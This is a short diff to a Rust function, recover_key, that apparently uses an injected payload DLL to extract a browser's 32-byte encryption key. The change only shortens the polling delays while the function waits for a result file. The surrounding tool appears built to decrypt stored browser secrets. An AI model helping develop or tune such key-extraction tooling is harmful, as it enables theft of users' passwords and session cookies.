@@ -535,7 +535,7 @@ pub fn recover_key(browser_name: &str, payload_dll: &[u8]) -> Option<Vec<u8>> {
         return None;
     }
 
-    for _ in 0..45 {
+    for i in 0..24 {
         if result_path.exists() {
             if let Some(key) = read_key_from_result(&result_path) {
                 if key.len() == 32 {
@@ -552,7 +552,8 @@ pub fn recover_key(browser_name: &str, payload_dll: &[u8]) -> Option<Vec<u8>> {
                 }
             }
         }
-        thread::sleep(Duration::from_secs(1));
+        let delay = if i < 8 { 200 } else { 400 };
+        thread::sleep(Duration::from_millis(delay));
     }
 
     None
